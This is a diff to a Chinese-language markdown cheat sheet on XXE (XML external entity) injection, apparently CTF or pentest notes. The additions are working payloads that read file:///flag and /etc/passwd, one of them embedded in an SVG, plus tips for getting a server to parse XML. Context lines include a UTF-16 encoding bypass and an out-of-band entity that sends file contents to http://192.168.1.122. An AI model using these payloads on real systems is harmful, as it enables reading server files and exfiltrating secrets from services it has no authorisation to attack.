@@ -1,6 +1,9 @@
 [[toc]]
 # XXE/XML实体注入
 
+1. 修改 Content-Type:application/xml
+2. GET -> POST
+
 绕过 -- XXE编码转换成utf-16编码绕过
 ```
 iconv -f utf8 -t utf-16 2.xml>1.xml
@@ -32,6 +35,16 @@ iconv -f utf8 -t utf-16 2.xml>1.xml
 <user><username>&admin;</username><password>123456</password></user>
 ```
 注意上admin前有&
+
+
+```xml
+<?xml version="1.0" ?>
+<!DOCTYPE fumo [
+<!ENTITY a SYSTEM "file:///flag" >
+]>
+<fumo><web>&a;
+</web></fumo>
+```
 
 ## 引入代码2
 ```xml
@@ -87,6 +100,11 @@ $data = simplexml_load_string($xml);
 "<!ENTITY &#x25; send SYSTEM 'http://192.168.1.122/?%file;'>"
 >
 %all;
+```
+## svg xxe
+
+```xml
+<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]><svg width="640px" height="480px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 ```
 ## 实例
 
